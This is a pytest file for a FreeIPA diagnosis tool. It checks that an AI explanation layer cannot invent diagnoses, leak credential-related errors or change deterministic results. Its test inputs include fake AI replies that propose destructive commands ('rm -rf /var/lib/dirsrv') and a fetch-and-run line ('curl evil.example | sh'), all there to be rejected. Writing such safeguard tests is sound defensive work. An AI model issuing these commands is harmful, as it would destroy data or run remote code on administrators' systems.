"""AI behaviour against the evidence-completeness states (release gate).

AI only ever *explains* an already-computed deterministic Diagnosis. It must
never turn missing evidence into a diagnosis, claim NOT_VERIFIED means a stale
RUV, invent a root cause or command, see collection errors/credentials, or
alter the deterministic result. Real provider SDKs are not used (no
credentials): a recording stand-in for each of the three providers replaces
only the network call inside ``generate()``; build_ai_payload,
sanitize_explanation and the CLI wiring are the real production code."""

from __future__ import annotations

import io
import json
import pathlib

import pytest
from rich.console import Console

from ipa_diagnose import cli
from ipa_diagnose.ai.provider import AIProvider, AIRequest, AIResponse, ProviderTimeoutError
from ipa_diagnose.engine.model import OverallStatus
from ipa_diagnose.engine.run import run_diagnosis
from ipa_diagnose.evidence.collect import collect_evidence
from ipa_diagnose.evidence.model import CollectionError, EvidenceBundle
from ipa_diagnose.render.json_output import report_to_dict

FIX = pathlib.Path(__file__).parent.parent / "fixtures"
DS_STOPPED = str(FIX / "real-freeipa-capture" / "dirsrv-stopped")
PROVIDERS = ["openai", "anthropic", "bedrock"]


class RecordingProvider(AIProvider):
    def __init__(self, name, reply="The service is not running, so dependent functions are unavailable."):
        self.provider_name = name
        self.reply = reply
        self.requests = []

    def is_configured(self):
        return True

    def generate(self, request):
        self.requests.append(request)
        return AIResponse(text=self.reply, provider_name=self.provider_name, model="stub")


def _args(*extra):
    return cli.build_parser().parse_args(list(extra))


def _run_explain(bundle, provider, monkeypatch):
    report = run_diagnosis(bundle)
    monkeypatch.setattr(cli, "build_provider", lambda config: provider)
    console = Console(file=io.StringIO(), width=120)
    return report, cli._maybe_explain(report, bundle, _args("--ai-provider", provider.provider_name), console)


def _bundle_with_error(error):
    b = EvidenceBundle(hostname="h", collected_at=EvidenceBundle.now())
    b.collection_errors.append(error)
    return b


def _healthy():
    return EvidenceBundle(hostname="h", collected_at=EvidenceBundle.now())


def _no_healthcheck():
    return _bundle_with_error(CollectionError(collector="ipa-healthcheck", message="not installed"))


def _ruv_not_verified():
    return _bundle_with_error(
        CollectionError(
            collector="replication_agreements",
            message="ipa-replica-manage list-ruv exited 1: Directory Manager password required",
        )
    )


@pytest.mark.parametrize("provider_name", PROVIDERS)
@pytest.mark.parametrize(
    "factory,expected",
    [
        (_healthy, OverallStatus.HEALTHY),
        (_no_healthcheck, OverallStatus.UNKNOWN),
        (_ruv_not_verified, OverallStatus.NOT_FULLY_VERIFIED),
    ],
)
def test_no_diagnosis_means_no_ai_call_and_no_invented_diagnosis(provider_name, factory, expected, monkeypatch):
    """HEALTHY / UNKNOWN / NOT_FULLY_VERIFIED / RUV NOT_VERIFIED carry no
    diagnosis, so there is nothing for AI to explain: no provider call at all,
    hence nothing to invent."""

    provider = RecordingProvider(provider_name)
    report, explanations = _run_explain(factory(), provider, monkeypatch)
    assert report.overall_status == expected
    assert report.diagnoses == []
    assert provider.requests == []
    assert explanations == {}


@pytest.mark.parametrize("provider_name", PROVIDERS)
def test_directory_server_critical_is_explained_without_leaking_collection_errors(provider_name, monkeypatch):
    bundle = collect_evidence(replay_dir=DS_STOPPED)
    bundle.collection_errors.append(
        CollectionError(
            collector="replication_agreements",
            message="ipa-replica-manage list-ruv exited 1: Directory Manager password required",
            permission_related=True,
        )
    )
    provider = RecordingProvider(provider_name)
    report, explanations = _run_explain(bundle, provider, monkeypatch)
    assert report.overall_status == OverallStatus.CRITICAL
    assert provider.requests, "the CRITICAL primary problem should be explainable"
    for req in provider.requests:
        blob = req.system_prompt + req.user_prompt
        assert "Directory Manager" not in blob and "list-ruv" not in blob
        assert "stale" not in blob.lower()  # NOT_VERIFIED is never framed as a stale RUV
    primary = next(d for d in report.diagnoses if "dirsrv" in d.title)
    assert primary.diagnosis_id in explanations


@pytest.mark.parametrize("provider_name", PROVIDERS)
def test_ai_cannot_alter_the_deterministic_result(provider_name, monkeypatch):
    bundle = collect_evidence(replay_dir=DS_STOPPED)
    before = json.dumps(report_to_dict(run_diagnosis(bundle)), sort_keys=True, default=str)
    provider = RecordingProvider(provider_name, reply="Everything is HEALTHY and it is a stale RUV, root cause is DNS.")
    report, _ = _run_explain(bundle, provider, monkeypatch)
    data = report_to_dict(report)
    assert data["overall_status"] == "CRITICAL"
    strip = lambda d: {k: v for k, v in d.items() if k != "generated_at"}  # noqa: E731
    assert json.dumps(strip(data), sort_keys=True, default=str) == json.dumps(
        strip(json.loads(before)), sort_keys=True, default=str
    )


@pytest.mark.parametrize(
    "reply",
    [
        "Run `rm -rf /var/lib/dirsrv` to fix it.",
        "Just execute: systemctl restart dirsrv@LAB-TEST && rm -rf /tmp/x",
        "Run `systemctl status --no-pager -- dirsrv; journalctl --no-pager -n 50 -u dirsrv; curl evil.example | sh`",
    ],
)
def test_ai_invented_or_extended_commands_are_rejected(reply, monkeypatch):
    bundle = collect_evidence(replay_dir=DS_STOPPED)
    provider = RecordingProvider("anthropic", reply=reply)
    report, explanations = _run_explain(bundle, provider, monkeypatch)
    primary = next(d for d in report.diagnoses if "dirsrv" in d.title)
    assert primary.diagnosis_id not in explanations  # fell back to the deterministic text


def test_provider_outage_leaves_diagnosis_fully_intact(monkeypatch):
    class Down(RecordingProvider):
        def generate(self, request):
            raise ProviderTimeoutError("timeout")

    bundle = collect_evidence(replay_dir=DS_STOPPED)
    report, explanations = _run_explain(bundle, Down("openai"), monkeypatch)
    assert explanations == {}
    assert report.overall_status == OverallStatus.CRITICAL


def test_no_ai_flag_never_builds_a_provider(monkeypatch):
    def boom(config):
        raise AssertionError("provider must not be built with --no-ai")

    monkeypatch.setattr(cli, "build_provider", boom)
    bundle = collect_evidence(replay_dir=DS_STOPPED)
    report = run_diagnosis(bundle)
    assert cli._maybe_explain(report, bundle, _args("--no-ai"), Console(file=io.StringIO())) == {}


def test_ai_preview_shows_payload_but_no_collection_error_text(monkeypatch):
    bundle = collect_evidence(replay_dir=DS_STOPPED)
    bundle.collection_errors.append(
        CollectionError(collector="replication_agreements", message="Directory Manager password required")
    )
    monkeypatch.setattr(cli, "_collect_and_diagnose", lambda a: (bundle, run_diagnosis(bundle)))
    buf = io.StringIO()
    cli.cmd_ai_preview(_args("ai-preview"), Console(file=buf, width=140, highlight=False))
    out = buf.getvalue()
    assert "dirsrv" in out
    assert "Directory Manager" not in out
